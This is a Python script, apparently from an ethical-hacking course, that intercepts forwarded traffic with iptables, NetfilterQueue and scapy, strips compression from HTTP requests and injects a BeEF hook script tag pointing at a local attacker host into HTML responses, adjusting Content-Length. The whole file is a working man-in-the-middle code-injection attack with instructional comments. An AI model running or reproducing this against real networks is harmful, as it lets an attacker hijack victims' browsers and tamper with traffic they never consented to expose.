#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import re

ack_list = [] # Initialize it once. Acknowledgment no's should be the same for the response as the request.

def subprocess_calls():
    subprocess.call("iptables --flush", shell = True)
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # FORWARD chain = Forward packets from the victim to router
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell = True) # No need if server is on the same machine.

def set_load(a_packet, a_load):
    a_packet[scapy.Raw].load = a_load
    del a_packet[scapy.IP].len  # Delete IP and TCP len and chksum
    del a_packet[scapy.IP].chksum
    del a_packet[scapy.TCP].chksum
    return a_packet

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())  # Give scapy the payload of the packet. Converted the packet to a scapy packet.

    # Modify the scapy packet.
    if scapy_packet.haslayer(scapy.Raw): # Inside Raw layer we have HTTP data. We have IP, TCP, Raw layer etc.
        load = scapy_packet[scapy.Raw].load
        # Analyzing HTTP packets based on Requests and Responses.
        if scapy_packet[scapy.TCP].dport == 80: # If destination port in tcp layer is 80, the packet is leaving computer to dest port of 80. So, it's http request.
            print("HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) # Modified load will receive a string. We're replacing everything with Accept-Encoding to the first //r//n with nothing "" in the load field.

        elif scapy_packet[scapy.TCP].sport == 80: # Packet is leaving http port of server.
            print("HTTP Response")
            injection_code = '<script src="http://172.16.61.213:3000/hook.js"></script>' # Got it from beef application. First run beef and username and pass = beef. Use single quotes as inside it's ""
            load = load.replace("</body>", injection_code + "</body>") # update load, but css and javascript doesn't have <body> tags.
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load) # We're trying to search Content-Lenght in load
            if content_length_search and "text/html" in load:  # Some responses might not have Content-Length and only html pages have <body> tags so we need to check if page is html. bing.com doesn't send Content-Length while digg.com does
                content_length = content_length_search.group(1) # We want the second result which is group 1
                new_content_length = int(content_length) + len(injection_code) # New content length is an integer
                load = load.replace(content_length, str(new_content_length)) # replace replaces strings, so convert new_content_length into string. As soon as load changes, we'll set_load and set_payload in if statement

        if load != scapy_packet[scapy.Raw].load: # We need to run this if the load changes above in any of the if or elif. So, this one is necessary if.
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept() # accept() will simply forward the packet


subprocess_calls()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # connect bind queue to queue that we created earlier in comments above. queue no 0 and callback function.
queue.run()

# At the end, service apache2 stop
# At the end, iptables --flush
